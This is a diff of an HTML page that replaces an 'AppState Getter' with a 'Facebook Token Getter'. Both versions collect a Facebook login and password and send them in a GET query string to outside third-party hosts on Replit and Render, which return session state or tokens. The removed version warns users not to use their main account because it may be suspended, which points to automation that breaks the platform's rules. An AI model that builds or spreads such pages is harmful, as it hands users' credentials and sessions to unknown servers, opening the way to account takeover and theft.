@@ -1,183 +1,87 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AppState Getter</title>
-    
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f0f0;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh; /* Ensure body takes full height */
-            position: relative; /* Needed for absolute positioning */
-        }
-        .card {
-            background: rgba(255, 255, 255, 0.8);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            max-width: 600px;
-            width: 100%;
-            margin-top: 20px;
-            z-index: 1;
-        }
-        h1 {
-            color: #333;
-            margin-top: 20px;
-            z-index: 1;
-            text-align: center; /* Center align the title */
-        }
-        #result {
-            margin-top: 20px;
-            white-space: pre-wrap;
-            background: rgba(255, 255, 255, 0.8);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            max-width: 600px;
-            width: 100%;
-            display: none;
-            z-index: 1;
-        }
-        #user-ip {
-            font-size: 1.2em;
-            color: #555;
-            margin-top: 20px;
-            z-index: 1;
-        }
-        .copy-btn {
-            margin-top: 10px;
-            z-index: 1;
-        }
-        .background {
-            position: fixed; /* Fixed to keep it in place */
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, #ff9a9e 0%, #fad0c4 100%);
-            animation: gradient 15s ease infinite;
-            z-index: 0;
-        }
-        @keyframes gradient {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        footer {
-            width: 100%;
-            text-align: center;
-            padding: 10px 0;
-            background: rgba(0, 0, 0, 0.8);
-            color: #fff;
-            position: absolute;
-            bottom: 0;
-            z-index: 1; /* Ensure it stays above other elements */
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Token Getter</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    .container input {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .container button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      background-color: #007bff;
+      color: #fff;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .container button:hover {
+      background-color: #0056b3;
+    }
+    .message {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
-    <div class="background"></div>
-    <h1>AppState Getter</h1>
-    <div class="card">
-        <form id="chilliForm">
-            <div class="form-group">
-                <label for="chilliEmail">Email:</label>
-                <input type="email" class="form-control" id="chilliEmail" name="chilliEmail" required>
-            </div>
-            <div class="form-group">
-                <label for="chilliPassword">Password:</label>
-                <input type="password" class="form-control" id="chilliPassword" name="chilliPassword" required>
-            </div>
-            <button type="submit" class="btn btn-primary btn-block">Submit</button>
-        </form>
-    </div>
-    <div id="chilliResult" class="card">
-        <pre id="resultText"></pre>
-        <button class="btn btn-secondary copy-btn" onclick="copyResult()">Copy</button>
-    </div>
-    <div id="user-ip"></div>
-    <footer>
-        © 2024 | Churchill | All rights reserved.
-    </footer>
+  <div class="container">
+    <h1>Facebook Token Getter</h1>
+    <input type="text" id="username" placeholder="Enter Facebook Username">
+    <input type="password" id="password" placeholder="Enter Facebook Password">
+    <button onclick="getToken()">Get Token</button>
+    <div class="message" id="message"></div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    async function getToken() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const message = document.getElementById('message');
 
+      if (!username || !password) {
+        message.textContent = 'Please enter both username and password.';
+        return;
+      }
 
-    <div class="modal" id="warningModal" tabindex="-1" role="dialog">
-        <div class="modal-dialog" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h5 class="modal-title">Warning</h5>
-                </div>
-                <div class="modal-body">
-                    <p>Do not use your main account.
-                    iyak ka talaga pag na supend</p>
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-primary" id="modalOkBtn">OK</button>
-                </div>
-            </div>
-        </div>
-    </div>
+      message.textContent = 'Fetching token...';
 
-    
-    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-
-    <script>
-        $(document).ready(function() {
-            $('#chilliForm').on('submit', async function(event) {
-                event.preventDefault();
-                const chilliEmail = $('#chilliEmail').val();
-                const chilliPassword = $('#chilliPassword').val();
-                const chilliUrl = `https://nash-rest-api.replit.app/app-state?email=${encodeURIComponent(chilliEmail)}&password=${encodeURIComponent(chilliPassword)}`;
-
-                try {
-                    const response = await fetch(chilliUrl);
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok ' + response.statusText);
-                    }
-                    const data = await response.json();
-                    $('#resultText').text(JSON.stringify(data, null, 2));
-                    $('#chilliResult').show();
-                } catch (error) {
-                    console.error('Error fetching the Facebook state:', error);
-                    $('#resultText').text('Error fetching the Facebook state.');
-                    $('#chilliResult').show();
-                }
-            });
-
-            
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    $('#user-ip').text(`Your IP Address: ${data.ip}`);
-                });
-
-            function copyResult() {
-                const resultText = document.getElementById('resultText');
-                const range = document.createRange();
-                range.selectNode(resultText);
-                window.getSelection().removeAllRanges();
-                window.getSelection().addRange(range);
-                document.execCommand('copy');
-                window.getSelection().removeAllRanges();
-                alert('Copied to clipboard');
-            }
-
-            // Show the warning modal on page load
-            $('#warningModal').modal('show');
-            $('#modalOkBtn').on('click', function() {
-                $('#warningModal').modal('hide');
-            });
-        });
-    </script>
+      try {
+        const response = await axios.get(`https://markdevs-api.onrender.com/fb/token?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`);
+        if (response.data && response.data.token) {
+          message.textContent = `Token: ${response.data.token}`;
+        } else {
+          message.textContent = 'Failed to retrieve token. Please check your credentials.';
+        }
+      } catch (error) {
+        console.error('Error fetching token:', error);
+        message.textContent = 'An error occurred while fetching the token.';
+      }
+    }
+  </script>
 </body>
 </html>
